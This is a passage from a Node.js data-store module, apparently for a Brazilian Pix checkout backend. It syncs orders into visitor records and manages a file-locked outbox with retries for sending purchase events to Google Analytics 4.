      if (!found) {
        const visId = o.visitorId || UUID();
        const newVis = shapeVisitor({
          ...VISITOR_DEFAULTS,
          id: visId,
          name: o.customer.name || 'Cliente Pix',
          cpf: doc,
          email: o.customer.email || '',
          phone: o.customer.phone || '',
          stage: isPaid ? 'pago' : 'checkout',
          stageIndex: isPaid ? 17 : 15,
          purchased: isPaid,
          pushSubscribed: false,
          ip: o.ip || '',
          browser: 'Outro',
          os: 'Outro',
          device: 'mobile',
          utmSource: 'direto',
          utmMedium: '',
          utmCampaign: '',
          utmTerm: '',
          utmContent: '',
          amount: Number(o.amount || 0),
          installments: 1,
          createdAt: o.createdAt || nowIso(),
          lastSeenAt: o.paidAt || o.createdAt || nowIso(),
          status: isPaid ? 'pagou_pix' : 'gerou_pix',
        });
        d.visitors[visId] = newVis;
        o.visitorId = visId;
        changed = true;
        supabase.upsertVisitor(newVis).catch(() => {});
      } else {
        if (!o.visitorId) {
          o.visitorId = found.id;
          changed = true;
        }
        if (isPaid && (!found.purchased || found.status !== 'pagou_pix')) {
          found.purchased = true;
          found.stage = 'pago';
          found.status = 'pagou_pix';
          changed = true;
          supabase.upsertVisitor(found).catch(() => {});
        }
      }
    }

    if (changed) {
      flushNow();
    }
    return Object.values(d.visitors).length;
  },

  /* ------------------------------- outbox ga4 ------------------------------- */
  acquireGa4Outbox(orderId, { staleTimeoutMs = 60000, maxRetries = 5, lockId } = {}) {
    return withFileLock(() => {
      const d = load(true);
      const o = d.orders[orderId];
      if (!o) return { acquired: false, reason: 'order_not_found' };

      const outbox = o.ga4Outbox || {};
      if (outbox.status === 'SENT') {
        return { acquired: false, reason: 'already_sent' };
      }

      if (outbox.status === 'IN_PROGRESS') {
        const lockAge = Date.now() - new Date(outbox.lockedAt || 0).getTime();
        if (lockAge <= staleTimeoutMs) {
          return { acquired: false, reason: 'in_progress_active', lockedBy: outbox.lockedBy };
        }
        console.warn(`[ga4-outbox] lock abandonado detectado para ordem ${orderId} (${Math.round(lockAge / 1000)}s atrás). Recuperando lock.`);
      }

      const currentAttempts = Number(outbox.attempts || 0);
      if (currentAttempts >= maxRetries) {
        o.ga4Outbox = {
          ...outbox,
          status: 'FAILED_PERMANENT',
          lastError: outbox.lastError || 'max_retries_exceeded',
          failedAt: nowIso(),
        };
        flushNow();
        return { acquired: false, reason: 'max_retries_exceeded', attempts: currentAttempts };
      }

      const nextAttempt = currentAttempts + 1;
      const workerId = lockId || `${process.pid}-${UUID().slice(0, 8)}`;
      o.ga4Outbox = {
        ...outbox,
        status: 'IN_PROGRESS',
        attempts: nextAttempt,
        lockedAt: nowIso(),
        lockedBy: workerId,
        lastAttemptAt: nowIso(),
        transactionId: o.id,
      };
      flushNow();
      return { acquired: true, order: o, attempt: nextAttempt, workerId };
    });
  },

  releaseGa4Outbox(orderId, { success, httpStatus, error, transportStatus } = {}) {
    return withFileLock(() => {
      const d = load(true);
      const o = d.orders[orderId];
      if (!o) return null;

      const current = o.ga4Outbox || {};
      if (success) {
        o.ga4Outbox = {
          ...current,
          status: 'SENT',
          // NOTA: HTTP 204 confirma o recebimento no edge do Google Analytics, não validação síncrona
          transportStatus: transportStatus || 'ACCEPTED_BY_EDGE',
          sentAt: nowIso(),
          httpStatus: httpStatus || 204,
          error: null,
        };
      } else {
        o.ga4Outbox = {
          ...current,
          status: 'FAILED',
          lastError: error || 'transmission_failed',
          failedAt: nowIso(),
          httpStatus: httpStatus || null,
        };
      }
      flushNow();
      return o.ga4Outbox;
    });
  },

  listPendingOrFailedGa4Outbox({ maxRetries = 5, staleTimeoutMs = 60000 } = {}) {
    const d = load(true);
    const now = Date.now();
    return Object.values(d.orders).filter((o) => {
      if (o.status !== 'COMPLETED') return false;
      const ob = o.ga4Outbox;
      if (!ob || ob.status === 'PENDING') return true;
      if (ob.status === 'FAILED' && (ob.attempts || 0) < maxRetries) return true;
      if (ob.status === 'IN_PROGRESS' && now - new Date(ob.lockedAt || 0).getTime() > staleTimeoutMs) return true;
      return false;
    });
  },

  async reconcileGa4Outbox({ ga4Module, maxRetries = 5, staleTimeoutMs = 60000 } = {}) {
    const ga4 = ga4Module || require('./ga4');
    const candidates = store.listPendingOrFailedGa4Outbox({ maxRetries, staleTimeoutMs });
    if (!candidates.length) return { processed: 0, successes: 0, failures: 0 };

    let successes = 0;
    let failures = 0;

    for (const order of candidates) {
      const lockRes = store.acquireGa4Outbox(order.id, { staleTimeoutMs, maxRetries });
      if (!lockRes.acquired) continue;

      const visitor = order.visitorId ? store.getVisitor(order.visitorId) : null;
      const combinedUser = {
        ...(visitor || {}),
        ...(order.customer || {}),
      };

      try {
        const res = await ga4.sendPurchase(order, combinedUser);
        if (res && res.success) {
          store.releaseGa4Outbox(order.id, {
            success: true,
            httpStatus: res.status,
            transportStatus: 'ACCEPTED_BY_EDGE',
          });
          successes++;
        } else {
          store.releaseGa4Outbox(order.id, {
            success: false,
            httpStatus: res?.status,
            error: res?.error || 'reconciliation_failed',
          });
          failures++;
        }
      } catch (err) {
        store.releaseGa4Outbox(order.id, {
          success: false,
          error: err.message,
        });
        failures++;
      }
    }

    return { processed: candidates.length, successes, failures };
  },

  uuid: UUID,
  id: makeId,
  utf8len,
  withFileLock,
};

module.exports = store;
